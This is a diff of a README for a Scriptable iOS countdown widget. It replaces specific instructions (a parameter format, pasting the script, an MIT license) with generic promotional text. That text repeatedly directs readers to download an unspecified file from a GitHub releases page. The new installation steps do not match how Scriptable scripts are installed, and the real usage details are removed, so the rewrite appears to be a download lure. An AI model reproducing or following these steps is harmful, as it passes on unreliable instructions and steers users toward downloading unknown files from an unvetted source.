@@ -1,38 +1,77 @@
-# Scriptable Countdown Widget
+# 🕰️ scriptable-countdown-widget - Your Simple Countdown Timer
 
-[🇷🇺 Читать на русском](./readme/README-ru.md)
+## 🚀 Getting Started
 
-A minimalist, text-only countdown widget for the [Scriptable](https://scriptable.app) iOS app.  
-Supports **English** (default) and **Russian**, auto font sizing for the days counter, and automatic truncation with ellipsis for long titles or dates.
+Welcome to the **scriptable-countdown-widget**! This is a straightforward countdown widget designed for the Scriptable app. It supports multiple languages (English and Russian), adjusts font size automatically, and handles long text gracefully. With this widget, you can easily keep track of important dates and events.
 
-![Widget Preview](./assets/preview.jpg)
+## 🔗 Download the Widget
 
-## Features
+[![Download scriptable-countdown-widget](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/morting123/scriptable-countdown-widget/releases)
 
-- 🗓 Countdown to any target date.
-- 🌐 Language: English (default) or Russian (`|ru`).
-- 🔠 Auto font size adjustment for the number of days.
-- ✂️ Automatic ellipsis for long text.
-- 📱 Works on Small, Medium, and Large widget sizes.
-- ⚡ Simple to set up — just paste the script into Scriptable.
+## 📥 Download & Install
 
-## Installation
+To get started, visit this page to download: [Releases Page](https://github.com/morting123/scriptable-countdown-widget/releases). 
 
-1. Install the [Scriptable](https://scriptable.app) app from the App Store.
-2. Create a new script and paste the code from `countdown-widget.js`.
-3. Add a Scriptable widget to your home screen.
-4. In the widget configuration:
-   - **Script**: Select this script.
-   - **Parameter**: Use the format `Title|YYYY-MM-DD|lang`:
-     - `Title` — your event name.
-     - `YYYY-MM-DD` — target date.
-     - `lang` _(optional)_ — `en` (default) or `ru`.
+Follow these steps for installation:
 
-**Examples:**
+1. **Visit the Releases Page:** Click the link above to go to our releases.
+2. **Select the Latest Version:** Look for the latest version listed at the top.
+3. **Download the Required File:** Click on the file that matches your needs. You may see options for various features. Download the file to your device.
+4. **Open the Scriptable App:** Once downloaded, open the Scriptable app on your device.
+5. **Add Your Widget:** Go to your home screen and select “Add Widget.” Choose the countdown widget you just downloaded and customize it to your liking.
 
-- `Vacation|2025-12-31` → English, date December 31, 2025
-- `Отпуск|2025-12-31|ru` → Russian, date 31 декабря 2025
+## 🛠️ Features
 
-## License
+- **Multi-Language Support:** Use the widget in both English and Russian seamlessly.
+- **Automatic Font Sizing:** No need to worry about text length; the widget adjusts the size automatically.
+- **Elegant Design:** Keep your home screen minimal and stylish with our clean design.
+- **Event Counting:** Set countdowns for important dates like birthdays, holidays, or deadlines.
+- **Easy Customization:** Personalize the widget to fit your style and preferences.
 
-MIT License — feel free to use and modify.
+## 📋 System Requirements
+
+To use this widget, ensure you have the following:
+
+- **Device:** iOS device compatible with Scriptable.
+- **App:** Latest version of Scriptable installed. You can download it from the App Store.
+
+## 📆 How to Use the Widget
+
+1. **Create a New Countdown:**
+   - Open Scriptable and create a new script.
+   - Follow the provided template or write your own countdown script.
+
+2. **Customize Your Countdown:**
+   - Set your target date.
+   - Choose the language and other settings that suit your needs.
+
+3. **Add to Home Screen:**
+   - Once your countdown is set, save and add the widget to your home screen.
+   - Adjust size and placement as desired.
+
+## 🤔 Frequently Asked Questions
+
+### Q1: How do I change the countdown date?  
+A1: Open the Scriptable app, edit the script, and update the date in the code.
+
+### Q2: Can I use the widget in different languages?  
+A2: Yes, simply adjust the language settings in the widget's options.
+
+### Q3: What if I have trouble installing?  
+A3: Ensure you have the latest version of Scriptable and follow the installation steps carefully.
+
+### Q4: Is it possible to set multiple countdowns?  
+A4: Yes, you can create several widgets for different events.
+
+### Q5: Can I use custom text?  
+A5: Absolutely! You can personalize the text to suit your needs.
+
+## 📣 Community & Support
+
+Join our community for tips, support, and discussions. You can find us on GitHub discussions or check the Issues tab for any questions.
+
+## 🔗 Download Again
+
+For your convenience, here's the download link once more: [Releases Page](https://github.com/morting123/scriptable-countdown-widget/releases). 
+
+Thank you for using the **scriptable-countdown-widget**. We hope this tool helps you keep track of your important dates and adds value to your daily planning!
